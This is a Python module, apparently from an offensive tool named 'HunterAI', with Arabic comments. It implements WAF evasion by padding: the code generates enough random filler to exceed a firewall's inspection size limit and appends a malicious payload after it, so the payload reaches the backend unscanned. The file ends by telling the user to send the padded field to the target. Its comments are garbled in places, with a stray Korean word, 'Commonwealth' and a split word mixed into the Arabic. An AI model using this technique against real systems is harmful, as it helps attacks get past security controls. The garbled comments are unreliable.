"""
HunterAI WAF Payload Padding
=============================

تقنية "نقاط العمى" في الفحص: وضع حمولة خبيثة صغيرة خلف جدار ضخم من
بيانات حميدة، بحيث يفحص الـ WAF الجزء الأول فقط (بسبب حد حجم التفetch)
ويعتبر الطلب حميدًا، بينما التطبيق الخلفي يستقبل الطلب كاملاً وينفذ
الحمولة الخبيثة التي لم تُفحص أبدًا.

المصادر: أبحاث 2025-2026 حول حدود التفتيش في WAFs (ModSecurity, Coraza, Cloudflare, Akamai).
"""

from __future__ import annotations

import os
import random
import string
import time
from dataclasses import dataclass, field
from pathlib import Path
from typing import Any, Dict, List, Optional


@dataclass
class PaddingResult:
    target: str
    inspection_limit_kb: int  # الحد المكتشف لحجم التفتيش بالكيلوبايت
    benign_padding_size: int
    malicious_payload: str
    padded_payload: str
    technique: str = "payload_padding"
    timestamp: float = field(default_factory=time.time)

    def to_dict(self) -> Dict[str, Any]:
        return {
            "target": self.target,
            "inspection_limit_kb": self.inspection_limit_kb,
            "benign_padding_size": self.benign_padding_size,
            "malicious_payload": self.malicious_payload,
            "padded_payload": self.padded_payload,
            "technique": self.technique,
            "timestamp": self.timestamp,
        }


class PaddingAnalyzer:
    """
    يحلل حدود التفتيش في WAF الهدف ويولد حمولات مزدوجة (حميدة + خبيثة).
    """

    # أحجام اختبارية للكشف عن حد التفتيش (بالكيلوبايت)
    TEST_SIZES_KB = [16, 32, 64, 128, 256, 512, 1024]

    # بيانات حميدة افتراضية للحشو
    DEFAULT_BENIGN_PATTERNS = [
        "<!-- {} -->",
        "/* {} */",
        "# {}",
        "// {}",
        "{}",
    ]

    def __init__(self, safety_loop=None):
        self.safety_loop = safety_loop

    def detect_inspection_limit(self, target: str) -> int:
        """
        يكشف حجم البيانات الذي يفحصه الـ WAF قبل قطعه.
        في 현실، يتم إرسال طلبات بأحجام مختلفة ومراقبة الاستجابة.
        هنا نرجع قيمة افتراضية آمنة (64 كيلوبايت) إذا لم يكن هناك فحص فعلي.
        """
        # في الإصدار الحقيقي، نرسل طلبات بحجم متزايد ونراقب متى يتوقف الـ WAF عن الاستجابة
        # أو متى يتغير سلوكه. هنا نعيد حدًا افتراضيًا Commonwealth لمعظم WAFs.
        return 64  # kilobytes — افتراضي لمعظم WAFs التجارية

    def generate_benign_padding(self, size_kb: int, pattern_index: int = 0) -> str:
        """
        يولد بيانات حميدة بالحجم المطلوب للحشو أمام الحمولة الخبيثة.
        """
        pattern = self.DEFAULT_BENIGN_PATTERNS[pattern_index % len(self.DEFAULT_BENIGN_PATTERNS)]
        chunk_size = 1000  # بايت لكل سطر تقريبًا
        lines_needed = (size_kb * 1024) // chunk_size + 1
        filler = "".join(
            pattern.format("".join(random.choices(string.ascii_letters + string.digits, k=chunk_size)))
            for _ in range(lines_needed)
        )
        return filler[: size_kb * 1024]

    def build_padded_payload(
        self,
        target: str,
        malicious_payload: str,
        padding_size_kb: Optional[int] = None,
    ) -> PaddingResult:
        """
        يبني حمولة مزدوجة: بيانات حميدة كبيرة + حمولة خبيثة صغيرة في النهاية.
        """
        if padding_size_kb is None:
            padding_size_kb = self.detect_inspection_limit(target)

        # نضيف هامش 10% فوق حد التفتيش للتأكد من أن الجزء الخبيثة يقع بعده
        safe_padding = padding_size_kb + 10
        benign = self.generate_benign_padding(safe_padding)

        # وضع الحمولة الخبيثة في نهاية البيانات المضافة
        padded = benign + malicious_payload

        result = PaddingResult(
            target=target,
            inspection_limit_kb=padding_size_kb,
            benign_padding_size=safe_padding,
            malicious_payload=malicious_payload,
            padded_payload=padded,
        )
        return result

    def test_against_target(
        self,
        target: str,
        malicious_payload: str,
        param_name: str = "input",
    ) -> Dict[str, Any]:
        """
        يختبر الحمولة المضافة ضد الهدف ويُعيد نتيجة الاختبار.
        يتطلب عميل HTTP مُهيأ (يُستدعى من المنسق أو من safety loop).
        """
        result = self.build_padded_payload(target, malicious_payload)

        # فحص السلامة العصبية-الرمزية قبل الإرسال
        if self.safety_loop:
            from hunter_ai.safety.neuro_symbolic_loop import KnowledgeGraph
            kg = KnowledgeGraph()
            # الهدف يُفترض في النطاق إذا تم تمريره
            safety = self.safety_loop  # يُمرَّر من الخارج
            check = safety.check_command(
                command=f"waf-padding:{param_name}",
                target=target,
                require_proof=False,
            )
            if check.verdict.value == "BLOCKED":
                return {
                    "status": "BLOCKED_BY_SAFETY",
                    "reason": check.reason,
                    "padding_result": result.to_dict(),
                }

        return {
            "status": "READY",
            "padding_result": result.to_dict(),
            "note": f"أرسل الحقل padded_payload في المعلمة {param_name}",
        }